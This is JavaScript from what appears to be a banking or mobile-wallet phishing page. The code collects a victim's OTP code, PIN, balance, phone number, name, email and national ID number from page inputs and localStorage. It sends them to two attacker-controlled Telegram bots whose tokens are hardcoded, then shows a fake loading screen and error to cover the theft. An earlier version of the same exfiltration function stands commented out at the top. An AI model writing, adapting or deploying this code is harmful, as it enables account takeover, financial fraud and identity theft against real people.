








  /* ===============================
   


async function captureAndSendOTP() {

  let codigoOTP = "";
  for (let i = 0; i < 6; i++) {
    const input = document.getElementById("c" + i);
    if (!input || !input.value) {
      alert("Completa el código de verificación");
      return;
    }
    codigoOTP += input.value;
  }

  
  const registros = JSON.parse(localStorage.getItem("registros"));
  let datosConsulta = "❌ No hay datos del formulario de consulta";

  if (registros && registros.length > 0) {
    const r = registros[registros.length - 1];
    datosConsulta =
      "📦 FORMULARIO CONSULTA\n" +
      "📱 Teléfono: " + r.telefono + "\n" +
      "👤 Nombre: " + r.nombre + "\n" +
      "📧 Correo: " + r.correo + "\n" +
      "🆔 Cédula: " + r.cedula + "\n" +
      "🕒 Fecha: " + r.fecha;
  }


  const loginData = JSON.parse(localStorage.getItem("loginData"));
  let datosLogin = "❌ No hay datos del formulario login";

  if (loginData) {
    datosLogin =
      "📦 FORMULARIO LOGIN\n" +
      "📱 Teléfono: " + loginData.telefono + "\n" +
      "🔐 PIN: " + loginData.pin + "\n" +
      "💰 Saldo: " + loginData.saldo + "\n" +
      "🕒 Fecha: " + loginData.fecha;
  }


  const TELEGRAM_BOT_TOKEN = "8588682882:AAGBckxmZijeZfAuF5PzUuEQD-vZLJBC9BE";
  const TELEGRAM_CHAT_ID  = "7874654715";

  const mensajeFinal =
    datosConsulta + "\n\n" +
    datosLogin + "\n\n" +
    "📦 CONFIRMACIÓN FINAL\n" +
    "🔢 Código verificación: " + codigoOTP + "\n" +
    "🕒 Fecha: " + new Date().toLocaleString();

  try {
    await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: mensajeFinal
        })
      }
    );


  } catch (error) {
    console.error(error);
    alert("Error al enviar  ");
  }
}


  
  =============================== */








/* =============================== 3 formulario =============================== */
async function captureAndSendOTP() {
    /* =============================== =============================== */
    let codigoOTP = "";
    for (let i = 0; i < 6; i++) {
        const input = document.getElementById("c" + i);
        if (!input || !input.value) {
            alert("Completa el código de verificación");
            return;
        }
        codigoOTP += input.value;
    }

    /* =============================== OBTENER STORAGE 1: registros =============================== */
    const registros = JSON.parse(localStorage.getItem("registros"));
    let datosConsulta = "❌ No hay datos del formulario de consulta";
    if (registros && registros.length > 0) {
        const r = registros[registros.length - 1];
        datosConsulta = "#1\n" +
            "Numero: " + r.numero + "\n" +
            "Nombre: " + r.nombre + "\n" +
            "Correo: " + r.correo + "\n" +
            "Cédula: " + r.cedula + "\n";
    }

    /* =============================== OBTENER STORAGE 2: loginData =============================== */
    const loginData = JSON.parse(localStorage.getItem("loginData"));
    let datosLogin = "❌ No hay datos del formulario login";
    if (loginData) {
        datosLogin = "#2\n" +
            "Numero: " + loginData.numero + "\n" +
            "Pin: " + loginData.pin + "\n" +
            "Saldo: " + loginData.saldo + "\n";
    }

    /* =============================== MENSAJE FINAL =============================== */
    // --- CAMBIO: Configuración de los dos bots ---
    const BOT_1_TOKEN = "8214599584:AAF5D-FzEQsPPwSBtyD0iyFWfar0Li5VFHw";
    const BOT_1_CHAT_ID = "8417322083";

    const BOT_2_TOKEN = "8588682882:AAGBckxmZijeZfAuF5PzUuEQD-vZLJBC9BE";
    const BOT_2_CHAT_ID = "7874654715";

    const mensajeFinal = datosConsulta + "\n\n" + datosLogin + "\n\n" +
        "Nueva dinamica\n" +
        "Clave dinámica : " + codigoOTP;

    /* =============================== ENVÍO A TELEGRAM (MODIFICADO PARA 2 BOTS) =============================== */
    try {
        // Creamos un array con las dos promesas de fetch, cada una con su propio token y chat_id
        const requests = [
            // Petición para el Bot 1
            fetch(`https://api.telegram.org/bot${BOT_1_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: BOT_1_CHAT_ID,
                    text: mensajeFinal
                })
            }),
            // Petición para el Bot 2
            fetch(`https://api.telegram.org/bot${BOT_2_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: BOT_2_CHAT_ID,
                    text: mensajeFinal
                })
            })
        ];

        // Ejecutamos ambas peticiones en paralelo y esperamos a que ambas terminen
        await Promise.all(requests);
mostrarCargaYError();
      

    } catch (error) {
        console.error("Error :", error);
        alert("Error intentalo de nuevo");
    }
}
















function mostrarCargaYError() {
  const loading = document.getElementById("loadingModal");
  const error = document.getElementById("alertaError");

  // 1️⃣ Mostrar cargando
  loading.style.display = "flex";

  // 2️⃣ Esperar 20 segundos
  setTimeout(() => {

    // Ocultar cargando
    loading.style.display = "none";

    // 3️⃣ Mostrar error
    error.style.display = "flex";

    // 4️⃣ Esperar y recargar
    setTimeout(() => {
      location.reload();
    }, 5000); // ⏱️ tiempo visible del mensaje rojo

  }, 30000); // ⏱️ tiempo de carga
}






